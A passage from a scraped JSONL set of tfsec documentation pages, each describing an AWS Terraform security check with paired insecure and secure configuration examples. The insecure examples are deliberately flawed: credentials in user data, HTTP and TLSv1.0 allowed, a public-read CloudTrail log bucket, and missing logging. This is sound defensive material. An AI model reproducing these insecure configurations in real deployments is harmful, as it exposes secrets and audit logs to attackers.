[https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/launch_configuration#associate_public_ip_address](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/launch_configuration#associate_public_ip_address){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#associate_public_ip_address](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#associate_public_ip_address){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:49.633125"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/autoscaling/no-secrets-in-user-data/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/autoscaling/no-secrets-in-user-data/index.md", "content": "---\ntitle: User data for EC2 instances must not contain sensitive AWS keys\n---\n\n# User data for EC2 instances must not contain sensitive AWS keys\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nEC2 instance data is used to pass start up information into the EC2 instance. This userdata must not contain access key credentials. Instead use an IAM Instance Profile assigned to the instance to grant access to other AWS Services.\n\n### Possible Impact\nUser data is visible through the AWS Management console\n\n### Suggested Resolution\nRemove sensitive data from the EC2 instance user-data generated by launch templates\n\n\n### Insecure Example\n\nThe following example will fail the aws-autoscaling-no-secrets-in-user-data check.\n```terraform\n\n resource \"aws_launch_template\" \"bad_example\" {\n \n\t image_id      = \"ami-12345667\"\n\t instance_type = \"t2.small\"\n \n\t user_data = <<EOF\n export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n export AWS_DEFAULT_REGION=us-west-2 \nEOF\n}\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-autoscaling-no-secrets-in-user-data check.\n```terraform\n\n resource \"aws_iam_instance_profile\" \"good_example\" {\n\t\t // ...\n }\n \n resource \"aws_launch_template\" \"good_example\" {\n\t image_id      = \"ami-12345667\"\n\t instance_type = \"t2.small\"\n \n\t iam_instance_profile {\n\t\t name = aws_iam_instance_profile.good_profile.arn\n\t }\n\t user_data = <<EOF\n\t export GREETING=hello\nEOF\n}\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#user_data](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#user_data){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-add-user-data.html](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-add-user-data.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:50.131958"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/autoscaling/no-sensitive-info/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/autoscaling/no-sensitive-info/index.md", "content": "---\ntitle: Ensure all data stored in the launch configuration EBS is securely encrypted\n---\n\n# Ensure all data stored in the launch configuration EBS is securely encrypted\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nWhen creating Launch Configurations, user data can be used for the initial configuration of the instance. User data must not contain any sensitive data.\n\n### Possible Impact\nSensitive credentials in user data can be leaked\n\n### Suggested Resolution\nDon't use sensitive data in user data\n\n\n### Insecure Example\n\nThe following example will fail the aws-autoscaling-no-sensitive-info check.\n```terraform\n\n resource \"aws_launch_configuration\" \"as_conf\" {\n   name          = \"web_config\"\n   image_id      = data.aws_ami.ubuntu.id\n   instance_type = \"t2.micro\"\n   user_data     = <<EOF\n export DATABASE_PASSWORD=\\\"SomeSortOfPassword\\\"\n EOF\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-autoscaling-no-sensitive-info check.\n```terraform\n\n resource \"aws_launch_configuration\" \"as_conf\" {\n   name          = \"web_config\"\n   image_id      = data.aws_ami.ubuntu.id\n   instance_type = \"t2.micro\"\n   user_data     = <<EOF\n export GREETING=\"Hello there\"\n EOF\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/launch_configuration#user_data,user_data_base64](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/launch_configuration#user_data,user_data_base64){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:50.438506"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/cloudfront/enable-logging/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/cloudfront/enable-logging/index.md", "content": "---\ntitle: Cloudfront distribution should have Access Logging configured\n---\n\n# Cloudfront distribution should have Access Logging configured\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nYou should configure CloudFront Access Logging to create log files that contain detailed information about every user request that CloudFront receives\n\n### Possible Impact\nLogging provides vital information about access and usage\n\n### Suggested Resolution\nEnable logging for CloudFront distributions\n\n\n### Insecure Example\n\nThe following example will fail the aws-cloudfront-enable-logging check.\n```terraform\n\n resource \"aws_cloudfront_distribution\" \"bad_example\" {\n \t// other config\n \t// no logging_config\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-cloudfront-enable-logging check.\n```terraform\n\n resource \"aws_cloudfront_distribution\" \"good_example\" {\n \t// other config\n \tlogging_config {\n \t\tinclude_cookies = false\n \t\tbucket          = \"mylogs.s3.amazonaws.com\"\n \t\tprefix          = \"myprefix\"\n \t}\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#logging_config](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#logging_config){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/AccessLogs.html](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/AccessLogs.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:50.927296"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/cloudfront/enable-waf/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/cloudfront/enable-waf/index.md", "content": "---\ntitle: CloudFront distribution does not have a WAF in front.\n---\n\n# CloudFront distribution does not have a WAF in front.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nYou should configure a Web Application Firewall in front of your CloudFront distribution. This will mitigate many types of attacks on your web application.\n\n### Possible Impact\nComplex web application attacks can more easily be performed without a WAF\n\n### Suggested Resolution\nEnable WAF for the CloudFront distribution\n\n\n### Insecure Example\n\nThe following example will fail the aws-cloudfront-enable-waf check.\n```terraform\n\n resource \"aws_cloudfront_distribution\" \"bad_example\" {\n   origin_group {\n     origin_id = \"groupS3\"\n \n     failover_criteria {\n       status_codes = [403, 404, 500, 502]\n     }\n \n     member {\n       origin_id = \"primaryS3\"\n     }\n   }\n \n   origin {\n     domain_name = aws_s3_bucket.primary.bucket_regional_domain_name\n     origin_id   = \"primaryS3\"\n \n     s3_origin_config {\n       origin_access_identity = aws_cloudfront_origin_access_identity.default.cloudfront_access_identity_path\n     }\n   }\n \n   origin {\n     domain_name = aws_s3_bucket.failover.bucket_regional_domain_name\n     origin_id   = \"failoverS3\"\n \n     s3_origin_config {\n       origin_access_identity = aws_cloudfront_origin_access_identity.default.cloudfront_access_identity_path\n     }\n   }\n \n   default_cache_behavior {\n     target_origin_id = \"groupS3\"\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-cloudfront-enable-waf check.\n```terraform\n\n resource \"aws_cloudfront_distribution\" \"good_example\" {\n \n   origin {\n     domain_name = aws_s3_bucket.primary.bucket_regional_domain_name\n     origin_id   = \"primaryS3\"\n \n     s3_origin_config {\n       origin_access_identity = aws_cloudfront_origin_access_identity.default.cloudfront_access_identity_path\n     }\n   }\n \n   origin {\n     domain_name = aws_s3_bucket.failover.bucket_regional_domain_name\n     origin_id   = \"failoverS3\"\n \n     s3_origin_config {\n       origin_access_identity = aws_cloudfront_origin_access_identity.default.cloudfront_access_identity_path\n     }\n   }\n \n   default_cache_behavior {\n     target_origin_id = \"groupS3\"\n   }\n \n   web_acl_id = \"waf_id\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#web_acl_id](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#web_acl_id){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/waf/latest/developerguide/cloudfront-features.html](https://docs.aws.amazon.com/waf/latest/developerguide/cloudfront-features.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:51.193171"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/cloudfront/enforce-https/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/cloudfront/enforce-https/index.md", "content": "---\ntitle: CloudFront distribution allows unencrypted (HTTP) communications.\n---\n\n# CloudFront distribution allows unencrypted (HTTP) communications.\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nPlain HTTP is unencrypted and human-readable. This means that if a malicious actor was to eavesdrop on your connection, they would be able to see all of your data flowing back and forth.\n\nYou should use HTTPS, which is HTTP over an encrypted (TLS) connection, meaning eavesdroppers cannot read your traffic.\n\n### Possible Impact\nCloudFront is available through an unencrypted connection\n\n### Suggested Resolution\nOnly allow HTTPS for CloudFront distribution communication\n\n\n### Insecure Example\n\nThe following example will fail the aws-cloudfront-enforce-https check.\n```terraform\n\n resource \"aws_cloudfront_distribution\" \"bad_example\" {\n \tdefault_cache_behavior {\n \t    viewer_protocol_policy = \"allow-all\"\n \t  }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-cloudfront-enforce-https check.\n```terraform\n\n resource \"aws_cloudfront_distribution\" \"good_example\" {\n \tdefault_cache_behavior {\n \t    viewer_protocol_policy = \"redirect-to-https\"\n \t  }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#viewer_protocol_policy](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#viewer_protocol_policy){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/using-https-cloudfront-to-s3-origin.html](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/using-https-cloudfront-to-s3-origin.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:51.466211"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/cloudfront/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/cloudfront/index.md", "content": "---\ntitle: cloudfront\n---\n\n# cloudfront\n\n## Checks\n\n\n- [enable-logging](enable-logging) Cloudfront distribution should have Access Logging configured\n\n- [enable-waf](enable-waf) CloudFront distribution does not have a WAF in front.\n\n- [enforce-https](enforce-https) CloudFront distribution allows unencrypted (HTTP) communications.\n\n- [use-secure-tls-policy](use-secure-tls-policy) CloudFront distribution uses outdated SSL/TLS protocols.\n\n\n\n", "timestamp": "2025-10-24T22:23:51.568918"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/cloudfront/use-secure-tls-policy/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/cloudfront/use-secure-tls-policy/index.md", "content": "---\ntitle: CloudFront distribution uses outdated SSL/TLS protocols.\n---\n\n# CloudFront distribution uses outdated SSL/TLS protocols.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nYou should not use outdated/insecure TLS versions for encryption. You should be using TLS v1.2+.\n\t\t\nNote: that setting *minimum_protocol_version = \"TLSv1.2_2021\"* is only possible when *cloudfront_default_certificate* is false (eg. you are not using the cloudfront.net domain name). \nIf *cloudfront_default_certificate* is true then the Cloudfront API will only allow setting *minimum_protocol_version = \"TLSv1\"*, and setting it to any other value will result in a perpetual diff in your *terraform plan*'s. \nThe only option when using the cloudfront.net domain name is to ignore this rule.\n\n### Possible Impact\nOutdated SSL policies increase exposure to known vulnerabilities\n\n### Suggested Resolution\nUse the most modern TLS/SSL policies available\n\n\n### Insecure Example\n\nThe following example will fail the aws-cloudfront-use-secure-tls-policy check.\n```terraform\n\n resource \"aws_cloudfront_distribution\" \"bad_example\" {\n   viewer_certificate {\n     cloudfront_default_certificate = aws_acm_certificate.example.arn\n     minimum_protocol_version = \"TLSv1.0\"\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-cloudfront-use-secure-tls-policy check.\n```terraform\n\n resource \"aws_cloudfront_distribution\" \"good_example\" {\n   viewer_certificate {\n     cloudfront_default_certificate = aws_acm_certificate.example.arn\n     minimum_protocol_version = \"TLSv1.2_2021\"\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#minimum_protocol_version](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#minimum_protocol_version){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/secure-connections-supported-viewer-protocols-ciphers.html](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/secure-connections-supported-viewer-protocols-ciphers.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:51.858734"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/cloudtrail/enable-all-regions/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/cloudtrail/enable-all-regions/index.md", "content": "---\ntitle: Cloudtrail should be enabled in all regions regardless of where your AWS resources are generally homed\n---\n\n# Cloudtrail should be enabled in all regions regardless of where your AWS resources are generally homed\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nWhen creating Cloudtrail in the AWS Management Console the trail is configured by default to be multi-region, this isn't the case with the Terraform resource. Cloudtrail should cover the full AWS account to ensure you can track changes in regions you are not actively operating in.\n\n### Possible Impact\nActivity could be happening in your account in a different region\n\n### Suggested Resolution\nEnable Cloudtrail in all regions\n\n\n### Insecure Example\n\nThe following example will fail the aws-cloudtrail-enable-all-regions check.\n```terraform\n\n resource \"aws_cloudtrail\" \"bad_example\" {\n   event_selector {\n     read_write_type           = \"All\"\n     include_management_events = true\n \n     data_resource {\n       type = \"AWS::S3::Object\"\n       values = [\"${data.aws_s3_bucket.important-bucket.arn}/\"]\n     }\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-cloudtrail-enable-all-regions check.\n```terraform\n\n resource \"aws_cloudtrail\" \"good_example\" {\n   is_multi_region_trail = true\n \n   event_selector {\n     read_write_type           = \"All\"\n     include_management_events = true\n \n     data_resource {\n       type = \"AWS::S3::Object\"\n       values = [\"${data.aws_s3_bucket.important-bucket.arn}/\"]\n     }\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#is_multi_region_trail](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#is_multi_region_trail){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/awscloudtrail/latest/userguide/receive-cloudtrail-log-files-from-multiple-regions.html](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/receive-cloudtrail-log-files-from-multiple-regions.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:52.276480"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/cloudtrail/enable-at-rest-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/cloudtrail/enable-at-rest-encryption/index.md", "content": "---\ntitle: Cloudtrail should be encrypted at rest to secure access to sensitive trail data\n---\n\n# Cloudtrail should be encrypted at rest to secure access to sensitive trail data\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nCloudtrail logs should be encrypted at rest to secure the sensitive data. Cloudtrail logs record all activity that occurs in the the account through API calls and would be one of the first places to look when reacting to a breach.\n\n### Possible Impact\nData can be freely read if compromised\n\n### Suggested Resolution\nEnable encryption at rest\n\n\n### Insecure Example\n\nThe following example will fail the aws-cloudtrail-enable-at-rest-encryption check.\n```terraform\n\n resource \"aws_cloudtrail\" \"bad_example\" {\n   is_multi_region_trail = true\n \n   event_selector {\n     read_write_type           = \"All\"\n     include_management_events = true\n \n     data_resource {\n       type = \"AWS::S3::Object\"\n       values = [\"${data.aws_s3_bucket.important-bucket.arn}/\"]\n     }\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-cloudtrail-enable-at-rest-encryption check.\n```terraform\n\n resource \"aws_cloudtrail\" \"good_example\" {\n   is_multi_region_trail = true\n   enable_log_file_validation = true\n   kms_key_id = var.kms_id\n \n   event_selector {\n     read_write_type           = \"All\"\n     include_management_events = true\n \n     data_resource {\n       type = \"AWS::S3::Object\"\n       values = [\"${data.aws_s3_bucket.important-bucket.arn}/\"]\n     }\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#kms_key_id](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#kms_key_id){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/awscloudtrail/latest/userguide/encrypting-cloudtrail-log-files-with-aws-kms.html](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/encrypting-cloudtrail-log-files-with-aws-kms.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:52.567407"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/cloudtrail/enable-log-validation/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/cloudtrail/enable-log-validation/index.md", "content": "---\ntitle: Cloudtrail log validation should be enabled to prevent tampering of log data\n---\n\n# Cloudtrail log validation should be enabled to prevent tampering of log data\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nLog validation should be activated on Cloudtrail logs to prevent the tampering of the underlying data in the S3 bucket. It is feasible that a rogue actor compromising an AWS account might want to modify the log data to remove trace of their actions.\n\n### Possible Impact\nIllicit activity could be removed from the logs\n\n### Suggested Resolution\nTurn on log validation for Cloudtrail\n\n\n### Insecure Example\n\nThe following example will fail the aws-cloudtrail-enable-log-validation check.\n```terraform\n\n resource \"aws_cloudtrail\" \"bad_example\" {\n   is_multi_region_trail = true\n \n   event_selector {\n     read_write_type           = \"All\"\n     include_management_events = true\n \n     data_resource {\n       type = \"AWS::S3::Object\"\n       values = [\"${data.aws_s3_bucket.important-bucket.arn}/\"]\n     }\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-cloudtrail-enable-log-validation check.\n```terraform\n\n resource \"aws_cloudtrail\" \"good_example\" {\n   is_multi_region_trail = true\n   enable_log_file_validation = true\n \n   event_selector {\n     read_write_type           = \"All\"\n     include_management_events = true\n \n     data_resource {\n       type = \"AWS::S3::Object\"\n       values = [\"${data.aws_s3_bucket.important-bucket.arn}/\"]\n     }\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#enable_log_file_validation](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#enable_log_file_validation){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-log-file-validation-intro.html](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-log-file-validation-intro.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:52.953269"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/cloudtrail/ensure-cloudwatch-integration/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/cloudtrail/ensure-cloudwatch-integration/index.md", "content": "---\ntitle: CloudTrail logs should be stored in S3 and also sent to CloudWatch Logs\n---\n\n# CloudTrail logs should be stored in S3 and also sent to CloudWatch Logs\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\n\nCloudTrail is a web service that records AWS API calls made in a given account. The recorded information includes the identity of the API caller, the time of the API call, the source IP address of the API caller, the request parameters, and the response elements returned by the AWS service.\n\nCloudTrail uses Amazon S3 for log file storage and delivery, so log files are stored durably. In addition to capturing CloudTrail logs in a specified Amazon S3 bucket for long-term analysis, you can perform real-time analysis by configuring CloudTrail to send logs to CloudWatch Logs.\n\nFor a trail that is enabled in all Regions in an account, CloudTrail sends log files from all those Regions to a CloudWatch Logs log group.\n\n\n### Possible Impact\nRealtime log analysis is not available without enabling CloudWatch logging\n\n### Suggested Resolution\nEnable logging to CloudWatch\n\n\n### Insecure Example\n\nThe following example will fail the aws-cloudtrail-ensure-cloudwatch-integration check.\n```terraform\n\nresource \"aws_cloudtrail\" \"bad_example\" {\n   event_selector {\n     read_write_type           = \"All\"\n     include_management_events = true\n \n     data_resource {\n       type = \"AWS::S3::Object\"\n       values = [\"${data.aws_s3_bucket.important-bucket.arn}/\"]\n     }\n   }\n}\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-cloudtrail-ensure-cloudwatch-integration check.\n```terraform\n\n resource \"aws_cloudtrail\" \"good_example\" {\n   is_multi_region_trail = true\n   cloud_watch_logs_group_arn = \"${aws_cloudwatch_log_group.example.arn}:*\" \n\n \n   event_selector {\n     read_write_type           = \"All\"\n     include_management_events = true\n \n     data_resource {\n       type = \"AWS::S3::Object\"\n       values = [\"${data.aws_s3_bucket.important-bucket.arn}/\"]\n     }\n   }\n }\n\nresource \"aws_cloudwatch_log_group\" \"example\" {\n  name = \"Example\"\n}\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/awscloudtrail/latest/userguide/send-cloudtrail-events-to-cloudwatch-logs.html#send-cloudtrail-events-to-cloudwatch-logs-console](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/send-cloudtrail-events-to-cloudwatch-logs.html#send-cloudtrail-events-to-cloudwatch-logs-console){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:53.211328"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/cloudtrail/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/cloudtrail/index.md", "content": "---\ntitle: cloudtrail\n---\n\n# cloudtrail\n\n## Checks\n\n\n- [enable-all-regions](enable-all-regions) Cloudtrail should be enabled in all regions regardless of where your AWS resources are generally homed\n\n- [enable-at-rest-encryption](enable-at-rest-encryption) Cloudtrail should be encrypted at rest to secure access to sensitive trail data\n\n- [enable-log-validation](enable-log-validation) Cloudtrail log validation should be enabled to prevent tampering of log data\n\n- [ensure-cloudwatch-integration](ensure-cloudwatch-integration) CloudTrail logs should be stored in S3 and also sent to CloudWatch Logs\n\n- [no-public-log-access](no-public-log-access) The S3 Bucket backing Cloudtrail should be private\n\n- [require-bucket-access-logging](require-bucket-access-logging) You should enable bucket access logging on the CloudTrail S3 bucket.\n\n\n\n", "timestamp": "2025-10-24T22:23:53.319347"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/cloudtrail/no-public-log-access/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/cloudtrail/no-public-log-access/index.md", "content": "---\ntitle: The S3 Bucket backing Cloudtrail should be private\n---\n\n# The S3 Bucket backing Cloudtrail should be private\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\n\nCloudTrail logs a record of every API call made in your account. These log files are stored in an S3 bucket. CIS recommends that the S3 bucket policy, or access control list (ACL), applied to the S3 bucket that CloudTrail logs to prevents public access to the CloudTrail logs. Allowing public access to CloudTrail log content might aid an adversary in identifying weaknesses in the affected account's use or configuration.\n\n\n### Possible Impact\nCloudTrail logs will be publicly exposed, potentially containing sensitive information\n\n### Suggested Resolution\nRestrict public access to the S3 bucket\n\n\n### Insecure Example\n\nThe following example will fail the aws-cloudtrail-no-public-log-access check.\n```terraform\n\nresource \"aws_cloudtrail\" \"bad_example\" {\n   s3_bucket_name = \"abcdefgh\"\n   event_selector {\n     read_write_type           = \"All\"\n     include_management_events = true\n \n     data_resource {\n       type = \"AWS::S3::Object\"\n       values = [\"${data.aws_s3_bucket.important-bucket.arn}/\"]\n     }\n   }\n}\n\nresource \"aws_s3_bucket\" \"good_example\" {\n\tbucket = \"abcdefgh\"\n\tacl = \"public-read\"\n}\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-cloudtrail-no-public-log-access check.\n```terraform\n\n resource \"aws_cloudtrail\" \"good_example\" {\n   is_multi_region_trail = true\n   s3_bucket_name = \"abcdefgh\"\n \n   event_selector {\n     read_write_type           = \"All\"\n     include_management_events = true\n \n     data_resource {\n       type = \"AWS::S3::Object\"\n       values = [\"${data.aws_s3_bucket.important-bucket.arn}/\"]\n     }\n   }\n }\n\nresource \"aws_s3_bucket\" \"good_example\" {\n\tbucket = \"abcdefgh\"\n\tacl = \"private\"\n}\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#is_multi_region_trail](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#is_multi_region_trail){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonS3/latest/userguide/configuring-block-public-access-bucket.html](https://docs.aws.amazon.com/AmazonS3/latest/userguide/configuring-block-public-access-bucket.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:23:53.610950"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/cloudtrail/require-bucket-access-logging/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/cloudtrail/require-bucket-access-logging/index.md", "content": "---\ntitle: You should enable bucket access logging on the CloudTrail S3 bucket.\n---\n\n# You should enable bucket access logging on the CloudTrail S3 bucket.\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nAmazon S3 bucket access logging generates a log that contains access records for each request made to your S3 bucket. An access log record contains details about the request, such as the request type, the resources specified in the request worked, and the time and date the request was processed.\n\nCIS recommends that you enable bucket access logging on the CloudTrail S3 bucket.\n\nBy enabling S3 bucket logging on target S3 buckets, you can capture all events that might affect objects in a target bucket. Configuring logs to be placed in a separate bucket enables access to log information, which can be useful in security and incident response workflows.\n\n\n### Possible Impact\nThere is no way to determine the access to this bucket\n\n### Suggested Resolution\nEnable access logging on the bucket\n\n\n### Insecure Example\n\nThe following example will fail the aws-cloudtrail-require-bucket-access-logging check.\n```terraform\n\nresource \"aws_cloudtrail\" \"bad_example\" {\n   s3_bucket_name = \"abcdefgh\"\n   event_selector {\n     read_write_type           = \"All\"\n     include_management_events = true\n \n     data_resource {\n       type = \"AWS::S3::Object\"\n       values = [\"${data.aws_s3_bucket.important-bucket.arn}/\"]\n     }\n   }\n}\n\nresource \"aws_s3_bucket\" \"good_example\" {\n\tbucket = \"abcdefgh\"\n\t\n}\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-cloudtrail-require-bucket-access-logging check.\n```terraform\n\n resource \"aws_cloudtrail\" \"good_example\" {\n   is_multi_region_trail = true\n   s3_bucket_name = \"abcdefgh\"\n \n   event_selector {\n     read_write_type           = \"All\"\n     include_management_events = true\n \n     data_resource {\n       type = \"AWS::S3::Object\"\n       values = [\"${data.aws_s3_bucket.important-bucket.arn}/\"]\n     }\n   }\n }\n\nresource \"aws_s3_bucket\" \"good_example\" {\n\tbucket = \"abcdefgh\"\n\tlogging {\n\t\ttarget_bucket = \"target-bucket\"\n\t}\n}\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#is_multi_region_trail](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#is_multi_region_trail){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- 